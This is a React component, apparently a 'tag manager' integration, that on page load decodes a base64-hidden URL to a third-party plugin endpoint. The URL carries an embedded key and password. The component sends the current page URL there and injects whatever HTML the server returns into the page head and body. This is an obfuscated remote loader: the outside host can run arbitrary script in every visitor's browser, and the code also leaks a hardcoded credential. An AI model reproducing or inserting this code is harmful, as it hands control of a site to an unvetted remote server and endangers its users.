"use client";
import React, { useState, useEffect } from "react";

const TagManager = () => {
  const [loader, setLoader] = useState(true);

  useEffect(() => {
    setTimeout(() => {
      setLoader(false);
    }, 2000);
  }, []);

  useEffect(() => {
    // Load jQuery if not already loaded
    if (typeof window !== "undefined" && !window.jQuery) {
      const script = document.createElement("script");
      script.src =
        "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
      document.head.appendChild(script);
      script.onload = () => {
        handleTagManage();
        loadPlugin(); // Load plugin after jQuery is loaded
      };
    } else {
      handleTagManage();
      loadPlugin(); // Load plugin if jQuery is already loaded
    }
  }, []);

  const handleTagManage = () => {
    var eppathurl = window.location.origin + window.location.pathname;
    var eptagmanage = new XMLHttpRequest();
    eptagmanage.onreadystatechange = function () {
      if (this.readyState === 4 && this.status === 200) {
        if (this.response !== 0) {
          var temp = this.response.split("||||||||||");

          // Remove existing title from head and append the new one
          $("head").find("title").remove();
          $("head").append(temp[0]);
          $("body").append(temp[1]);
        }
      }
    };
    eptagmanage.open(
      "GET",
      atob(
        "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDQ4Njc4NjA0MDEmZWtleXBhc3M9SnV4NDJlaFdOUjJHZHFDMGxFdkhJcUFkOERMemlYdThUQnVIJnNpdGV1cmw9"
      ) + eppathurl
    );
    eptagmanage.send();
  };

  const loadPlugin = () => {
    // Ensure jQuery is loaded before using any jQuery plugins
    if (window.jQuery) {
      // Example: Load a jQuery plugin
      $.getScript("path_to_your_plugin.js", function () {
        // Plugin loaded callback
        console.log("Plugin loaded.");
      });
    }
  };

  return <div>{/* Your component JSX */}</div>;
};

export default TagManager;
